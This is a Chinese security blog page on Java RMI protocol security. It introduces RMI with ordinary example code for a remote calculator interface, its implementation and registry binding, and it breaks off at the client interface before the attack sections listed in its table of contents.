<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>JAVA 协议安全笔记-RMI篇 | Eki&#39;s blog</title>
    <meta name="generator" content="VuePress 1.9.5">
    <link rel="icon" href="/img/favicon.ico">
    <undefined></undefined>
    <link rel="alternate" type="application/rss+xml" href="https://blog.ieki.xyz/rss.xml" title="Eki&#39;s blog RSS Feed">
    <link rel="alternate" type="application/atom+xml" href="https://blog.ieki.xyz/feed.atom" title="Eki&#39;s blog Atom Feed">
    <link rel="alternate" type="application/json" href="https://blog.ieki.xyz/feed.json" title="Eki&#39;s blog JSON Feed">
    <meta name="description" content="网络空间安全技术博客">
    <meta name="keywords" content="CTF,Pentest,网络空间安全">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#11a8cd">
    
    <link rel="preload" href="/assets/css/0.styles.05e4719f.css" as="style"><link rel="preload" href="/assets/js/app.8153bfb8.js" as="script"><link rel="preload" href="/assets/js/2.236d623d.js" as="script"><link rel="preload" href="/assets/js/68.fafb9569.js" as="script"><link rel="prefetch" href="/assets/js/10.46edbeee.js"><link rel="prefetch" href="/assets/js/100.6c7b5950.js"><link rel="prefetch" href="/assets/js/11.767adcb8.js"><link rel="prefetch" href="/assets/js/12.512cfd28.js"><link rel="prefetch" href="/assets/js/13.3a1a8df2.js"><link rel="prefetch" href="/assets/js/14.9af53798.js"><link rel="prefetch" href="/assets/js/15.ec2fb3eb.js"><link rel="prefetch" href="/assets/js/16.2a2ab730.js"><link rel="prefetch" href="/assets/js/17.f68cb202.js"><link rel="prefetch" href="/assets/js/18.63691748.js"><link rel="prefetch" href="/assets/js/19.c42e067a.js"><link rel="prefetch" href="/assets/js/20.d572d5a9.js"><link rel="prefetch" href="/assets/js/21.2adaf23d.js"><link rel="prefetch" href="/assets/js/22.ec130e8f.js"><link rel="prefetch" href="/assets/js/23.91dff6b1.js"><link rel="prefetch" href="/assets/js/24.e99440a5.js"><link rel="prefetch" href="/assets/js/25.c058aace.js"><link rel="prefetch" href="/assets/js/26.64c96eb1.js"><link rel="prefetch" href="/assets/js/27.dc5608c6.js"><link rel="prefetch" href="/assets/js/28.6485ffc0.js"><link rel="prefetch" href="/assets/js/29.853384e7.js"><link rel="prefetch" href="/assets/js/3.18b28bc3.js"><link rel="prefetch" href="/assets/js/30.5e8757c8.js"><link rel="prefetch" href="/assets/js/31.f620c04c.js"><link rel="prefetch" href="/assets/js/32.0b35c345.js"><link rel="prefetch" href="/assets/js/33.643f4002.js"><link rel="prefetch" href="/assets/js/34.17bda2ac.js"><link rel="prefetch" href="/assets/js/35.3194ffeb.js"><link rel="prefetch" href="/assets/js/36.7a864c05.js"><link rel="prefetch" href="/assets/js/37.ded9d5a1.js"><link rel="prefetch" href="/assets/js/38.e886837c.js"><link rel="prefetch" href="/assets/js/39.6fbcf82c.js"><link rel="prefetch" href="/assets/js/4.aa35785a.js"><link rel="prefetch" href="/assets/js/40.042825c7.js"><link rel="prefetch" href="/assets/js/41.be0e220a.js"><link rel="prefetch" href="/assets/js/42.16c54959.js"><link rel="prefetch" href="/assets/js/43.15487375.js"><link rel="prefetch" href="/assets/js/44.1bc3c0c9.js"><link rel="prefetch" href="/assets/js/45.4f713272.js"><link rel="prefetch" href="/assets/js/46.e09111f6.js"><link rel="prefetch" href="/assets/js/47.36f7aeac.js"><link rel="prefetch" href="/assets/js/48.f34dbf5d.js"><link rel="prefetch" href="/assets/js/49.736656d6.js"><link rel="prefetch" href="/assets/js/5.bf7c6b0f.js"><link rel="prefetch" href="/assets/js/50.198eeffb.js"><link rel="prefetch" href="/assets/js/51.97647028.js"><link rel="prefetch" href="/assets/js/52.c52a4607.js"><link rel="prefetch" href="/assets/js/53.7c2edc1a.js"><link rel="prefetch" href="/assets/js/54.fffca202.js"><link rel="prefetch" href="/assets/js/55.5ae50670.js"><link rel="prefetch" href="/assets/js/56.495068e5.js"><link rel="prefetch" href="/assets/js/57.a87d7435.js"><link rel="prefetch" href="/assets/js/58.67aa347c.js"><link rel="prefetch" href="/assets/js/59.df8d3736.js"><link rel="prefetch" href="/assets/js/6.3a52ecd1.js"><link rel="prefetch" href="/assets/js/60.dfcbd8de.js"><link rel="prefetch" href="/assets/js/61.c190617e.js"><link rel="prefetch" href="/assets/js/62.4cebd179.js"><link rel="prefetch" href="/assets/js/63.27f549f4.js"><link rel="prefetch" href="/assets/js/64.aa783284.js"><link rel="prefetch" href="/assets/js/65.5c153c60.js"><link rel="prefetch" href="/assets/js/66.57abb67a.js"><link rel="prefetch" href="/assets/js/67.3e60853d.js"><link rel="prefetch" href="/assets/js/69.bb71fbbe.js"><link rel="prefetch" href="/assets/js/7.ec46daa9.js"><link rel="prefetch" href="/assets/js/70.55a74c83.js"><link rel="prefetch" href="/assets/js/71.6edff065.js"><link rel="prefetch" href="/assets/js/72.2272d6b4.js"><link rel="prefetch" href="/assets/js/73.84a336f4.js"><link rel="prefetch" href="/assets/js/74.743857b6.js"><link rel="prefetch" href="/assets/js/75.7afd7794.js"><link rel="prefetch" href="/assets/js/76.c69ff262.js"><link rel="prefetch" href="/assets/js/77.a3789c9d.js"><link rel="prefetch" href="/assets/js/78.0a082dca.js"><link rel="prefetch" href="/assets/js/79.ac794bd1.js"><link rel="prefetch" href="/assets/js/8.20733eb2.js"><link rel="prefetch" href="/assets/js/80.f346fded.js"><link rel="prefetch" href="/assets/js/81.1148a126.js"><link rel="prefetch" href="/assets/js/82.a0646f03.js"><link rel="prefetch" href="/assets/js/83.3f5285e3.js"><link rel="prefetch" href="/assets/js/84.0b41ad40.js"><link rel="prefetch" href="/assets/js/85.05acaff5.js"><link rel="prefetch" href="/assets/js/86.6332ed81.js"><link rel="prefetch" href="/assets/js/87.1e154849.js"><link rel="prefetch" href="/assets/js/88.ef9fe71b.js"><link rel="prefetch" href="/assets/js/89.644c6266.js"><link rel="prefetch" href="/assets/js/9.34ad444d.js"><link rel="prefetch" href="/assets/js/90.7a517ed7.js"><link rel="prefetch" href="/assets/js/91.724c1d33.js"><link rel="prefetch" href="/assets/js/92.c37e9d81.js"><link rel="prefetch" href="/assets/js/93.e6e1d6ba.js"><link rel="prefetch" href="/assets/js/94.bd88bff3.js"><link rel="prefetch" href="/assets/js/95.a64b5926.js"><link rel="prefetch" href="/assets/js/96.11700cb6.js"><link rel="prefetch" href="/assets/js/97.61fe23a4.js"><link rel="prefetch" href="/assets/js/98.0ae964e9.js"><link rel="prefetch" href="/assets/js/99.44a05c74.js">
    <link rel="stylesheet" href="/assets/css/0.styles.05e4719f.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu have-body-img"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/EB-logo.png" alt="Eki's blog" class="logo"> <span class="site-name can-hide">Eki's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">Home</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="CTF" class="dropdown-title"><a href="/ctf/" class="link-title">CTF</a> <span class="title" style="display:none;">CTF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>Library</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/php/" class="nav-link">PHP</a></li><li class="dropdown-subitem"><a href="/ctf/java/" class="nav-link">JAVA</a></li><li class="dropdown-subitem"><a href="/pages/f33ffd/" class="nav-link">Node</a></li><li class="dropdown-subitem"><a href="/pages/5939d7/" class="nav-link">Python</a></li></ul></li><li class="dropdown-item"><h4>Contest</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/pages/f3f203/" class="nav-link">D3CTF 2021 Write Up</a></li><li class="dropdown-subitem"><a href="/pages/8c33ec/" class="nav-link">虎符CTF2021</a></li><li class="dropdown-subitem"><a href="/pages/06932d/" class="nav-link">2021 红帽 Web Write Up</a></li></ul></li><li class="dropdown-item"><h4>Problem Set</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/ethernaut/" class="nav-link">Ethernaut Write Up</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/pentest/" class="nav-link">Pentest</a></div><div class="nav-item"><a href="/develop/" class="nav-link">Develop</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="More" class="dropdown-title"><a href="/more/" class="link-title">More</a> <span class="title" style="display:none;">More</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/friends/" class="nav-link">Friends</a></li></ul></div></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Favorites" class="dropdown-title"><a href="/pages/beb6c0bd8a66cea6/" class="link-title">Favorites</a> <span class="title" style="display:none;">Favorites</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/beb6c0bd8a66cea6/" class="nav-link">Website</a></li><li class="dropdown-item"><!----> <a href="/pages/eee83a9211a70f9d/" class="nav-link">Tools</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Archives" class="dropdown-title"><a href="/archives/" class="link-title">Archives</a> <span class="title" style="display:none;">Archives</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">Categories</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">Tags</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">Archives</a></li></ul></div></div> <a href="https://github.com/EkiXu/blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://cdn.jsdelivr.net/gh/EkiXu/pics/imgme.png"> <div class="blogger-info"><h3>Eki</h3> <span>Dreamer of Dreams</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">Home</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="CTF" class="dropdown-title"><a href="/ctf/" class="link-title">CTF</a> <span class="title" style="display:none;">CTF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>Library</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/php/" class="nav-link">PHP</a></li><li class="dropdown-subitem"><a href="/ctf/java/" class="nav-link">JAVA</a></li><li class="dropdown-subitem"><a href="/pages/f33ffd/" class="nav-link">Node</a></li><li class="dropdown-subitem"><a href="/pages/5939d7/" class="nav-link">Python</a></li></ul></li><li class="dropdown-item"><h4>Contest</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/pages/f3f203/" class="nav-link">D3CTF 2021 Write Up</a></li><li class="dropdown-subitem"><a href="/pages/8c33ec/" class="nav-link">虎符CTF2021</a></li><li class="dropdown-subitem"><a href="/pages/06932d/" class="nav-link">2021 红帽 Web Write Up</a></li></ul></li><li class="dropdown-item"><h4>Problem Set</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/ethernaut/" class="nav-link">Ethernaut Write Up</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/pentest/" class="nav-link">Pentest</a></div><div class="nav-item"><a href="/develop/" class="nav-link">Develop</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="More" class="dropdown-title"><a href="/more/" class="link-title">More</a> <span class="title" style="display:none;">More</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/friends/" class="nav-link">Friends</a></li></ul></div></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Favorites" class="dropdown-title"><a href="/pages/beb6c0bd8a66cea6/" class="link-title">Favorites</a> <span class="title" style="display:none;">Favorites</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/beb6c0bd8a66cea6/" class="nav-link">Website</a></li><li class="dropdown-item"><!----> <a href="/pages/eee83a9211a70f9d/" class="nav-link">Tools</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Archives" class="dropdown-title"><a href="/archives/" class="link-title">Archives</a> <span class="title" style="display:none;">Archives</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">Categories</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">Tags</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">Archives</a></li></ul></div></div> <a href="https://github.com/EkiXu/blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>JAVA 协议安全笔记-RMI篇</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/08fdb2/#_0x00-rmi介绍" class="sidebar-link">0x00 RMI介绍</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/pages/08fdb2/#quickstart" class="sidebar-link">QuickStart</a></li><li class="sidebar-sub-header level3"><a href="/pages/08fdb2/#发生了什么" class="sidebar-link">发生了什么</a></li><li class="sidebar-sub-header level3"><a href="/pages/08fdb2/#流量分析" class="sidebar-link">流量分析</a></li></ul></li><li><a href="/pages/08fdb2/#_0x01-信息泄露问题" class="sidebar-link">0x01 信息泄露问题</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/08fdb2/#_0x02-远程加载类安全问题" class="sidebar-link">0x02 远程加载类安全问题</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/08fdb2/#_0x03-序列化安全问题" class="sidebar-link">0x03 序列化安全问题</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/pages/08fdb2/#远程方法参数反序列化-服务端提供的远程方法" class="sidebar-link">远程方法参数反序列化 （服务端提供的远程方法）</a></li><li class="sidebar-sub-header level3"><a href="/pages/08fdb2/#远程方法参数反序列化2-注册中心registry提供的远程方法" class="sidebar-link">远程方法参数反序列化2 （注册中心Registry提供的远程方法）</a></li><li class="sidebar-sub-header level3"><a href="/pages/08fdb2/#远程函数返回值导致的反序列化" class="sidebar-link">远程函数返回值导致的反序列化</a></li><li class="sidebar-sub-header level3"><a href="/pages/08fdb2/#远程方法报错信息导致的反序列化-jrmp协议引发的反序列化" class="sidebar-link">远程方法报错信息导致的反序列化（JRMP协议引发的反序列化）</a></li></ul></li><li><a href="/pages/08fdb2/#_0x04小结" class="sidebar-link">0x04小结</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/08fdb2/#参考资料" class="sidebar-link">参考资料</a><ul class="sidebar-sub-headers"></ul></li></ul></section></li></ul> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-06225672><div class="articleInfo" data-v-06225672><!----> <div class="info" data-v-06225672><div title="作者" class="author iconfont icon-touxiang" data-v-06225672><a href="https://ieki.xyz" target="_blank" title="作者" class="beLink" data-v-06225672>Eki</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-06225672><a href="javascript:;" data-v-06225672>2022-02-11</a></div> <div title="分类" class="date iconfont icon-wenjian" data-v-06225672><a href="/categories/?category=%E9%9A%8F%E7%AC%94" data-v-06225672>随笔 </a></div></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABH1JREFUSA3tVl1oHFUUPmdmd2ltklqbpJDiNnXFmgbFktho7YMPNiJSSZM0+CAYSkUELVhM6YuwIPpgoOKDqOBDC0XE2CQoNtQXBUFTTcCi+Wlh1V2TQExsUzcltd3M9Tt3ZjZzZ2fT+OJTL8yeM+eee757fmeJbq//KQL8X3DUSFOcfr7cRsRtxNQMWueeVzOkaITIGqQHNg5y8+jNW9ldM7A6nTpAjuolUikAwq7CE3WcM2RRDz+XGVgN3FptU/aUSlvq9Pa3iZ1+sgAqJyyAFqkipd9dqiwHF3P65YycLWc/6sqGrvoEoIp6DOFaX5h6+dnfjkWprwqsPk0dUGq5vySwDImC10KxFHgGL1SWoc92O3eVht09qdXNH11I2SsTsJYqMWzihqGMi+A+Garf3BAuuLI5oGlULyNfyB/HYNujwktOfRrMr5t77NmevqaUopx0grnKAyvVpmwUDB4x6FPXuGvYLTDwWsejwgtgkYKPqRJg8SV6xaiZ3ZTppGneS4yfH5/66fZSDHv+QZci/+h5c5UHtpy67JUqGppM0sh0Nc1dW6/N1W5Yoqat8/TU/VnadmdeW2PLLSyh0cvxBs3KbqTmwYPpxN4do/mzE8nEpvX/UMu2Wbp74zUAK5q6WkHns7V0eWkdPbPzd3rxkTGybadYySumVzhcaJFbs5UrEkQ/+CK8gF5dnh/6ciIZ73gwQ927L1IitoxKLXYP3SjYdOrHHfTZhRRlFyrorafPk20B3HPD1y2G3qKZME5Jcf3t/HUC13/8tSd++vqFveMUTwAUxSUFI1QekR1+bIze3D9MF2aq6cPvG72CgnldWCFqyRw3lwH8ZMerjTD9ElRO7Gv44wNpC90aASqGfVlz/Rx17srQ57/UU26hkhQqUB7dBR71WmzQhHUnblGmVOEw0jhbV1n9OlXUDCIRGaNV5Jp43N516fN7JmnTHdfp7Hgy0luO4aMhtkLL8Bi3bUWYvzh5Mn1dTxrL6QmGuRhGL/TiTTxRoEdTszSaq9GR0NGA3KdkOz3hqSV3MIDhQ5IVX/Ivx3umBti2es2h4eZby7x8br1rkf7Mo90AqC8aQ3sJeNzqFRu+vSANAQe3PL7l0HGOAdwDCeZYvNKeoZp1Qfs6Aipndh86HmFRi0LAnEO47wsqM6cdfjh3jBPUzhZy7nvlUfFsamED1VQt6aISHVymXZ/B2aCtIG8AI8xfobj2d3en1wWVhOeHELKmLQ1s211s88comkv4UCwWyF787mJdYXtNfhKAXVqnKTq8QZvGAGGOfaTo5pGZ/PwbUCr5+DPr/1J92JNHr9aOl/F3iI5+O1nfybsGxoimvZ3ViWSluDITw3P37mypheDIPY0tw7+O/5ApbkYw+zpfaUVu32Pi98+defdUhEpZkRFq0aqyNh9FuL9hpYbEm6iwi0z2REd09ZmyENEbuhjDWzKvZXTqKYaBIr3tt5kuPtQBZFvEUwHt60vfCNu41XsksH9Ij1BMMz1Y0OOunHNShFIP5868g5zeXmuLwL9T4b6Q2+KejgAAAABJRU5ErkJggg==">JAVA 协议安全笔记-RMI篇<!----></h1>  <div class="theme-vdoing-content content__default"><h1 id="java-协议安全笔记-rmi篇"><a href="#java-协议安全笔记-rmi篇" class="header-anchor">#</a> JAVA 协议安全笔记-RMI篇</h1> <blockquote><p>本文首发于跳跳糖社区 https://tttang.com/archive/1430/</p></blockquote> <h2 id="_0x00-rmi介绍"><a href="#_0x00-rmi介绍" class="header-anchor">#</a> 0x00 RMI介绍</h2> <p>RMI的全名为<code>Remote Method Invocation</code>即远程方法调用，他的出现是为了解决一个问题，如何在本地透明的调用远程服务器上的方法。废话不多说，我们直接从一个用例来快速上手。</p> <h3 id="quickstart"><a href="#quickstart" class="header-anchor">#</a> QuickStart</h3> <h4 id="server"><a href="#server" class="header-anchor">#</a> Server</h4> <p>在RMI远程调用中，类似c语言中的头文件和源文件，我们的声明和实现是分开的（客户端只关心调用结果而不关系实现方法），所以我们需要抽象出一个接口，为了让其能被远程调用我们需要让这个接口继承<code>java.rmi.Remote</code></p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">xyz<span class="token punctuation">.</span>eki</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Remote</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ICalc</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> params<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>然后我们实现这个接口</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">xyz<span class="token punctuation">.</span>eki</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">UnicastRemoteObject</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Calc</span> <span class="token keyword">extends</span> <span class="token class-name">UnicastRemoteObject</span> <span class="token keyword">implements</span> <span class="token class-name">ICalc</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> baseNumber <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>

    <span class="token keyword">protected</span> <span class="token class-name">Calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> params<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Integer</span> sum <span class="token operator">=</span> baseNumber<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Integer</span> param <span class="token operator">:</span> params<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            sum <span class="token operator">+=</span> param<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> sum<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>Server部分所需要的东西就完成了</p> <h4 id="registry"><a href="#registry" class="header-anchor">#</a> Registry</h4> <p>Registry的注册很简单，只需要调用java给我们提供好的Registry类即可，这里我们调用<code>LocateRegistry.createRegistry</code>建立一个Registry，监听1099端口，同时将clac这个对象实例绑定到register的&quot;calc&quot;路径上。</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token punctuation">{</span>
    <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">ICalc</span> calc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">,</span>calc<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>我们也可以直接使用<code>java.rmi.Naming</code>提供的静态方法</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>Naming.bind(&quot;rmi://example.com:1099/calc&quot;, clac);
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>可以看到Registry和Server的耦合程度是比较高的。这段代码同时提供了Server和Registry的作用。事实上，在jdk8u141之后Registry通过AccessController对注册请求IP有要求，只允许本机ip进行注册。</p> <p><img src="https://md.buptmerak.cn/uploads/upload_b80652d7bf108f7a1bb2be7c758c3a2a.png" alt=""></p> <h4 id="client"><a href="#client" class="header-anchor">#</a> Client</h4> <p>通过Registry远程调用Server上实例对象的方法，因为只需要接口的方法，所以只要在Client端有一份接口的定义就行了。</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">xyz<span class="token punctuation">.</span>eki</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Remote</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ICalc</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> params<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

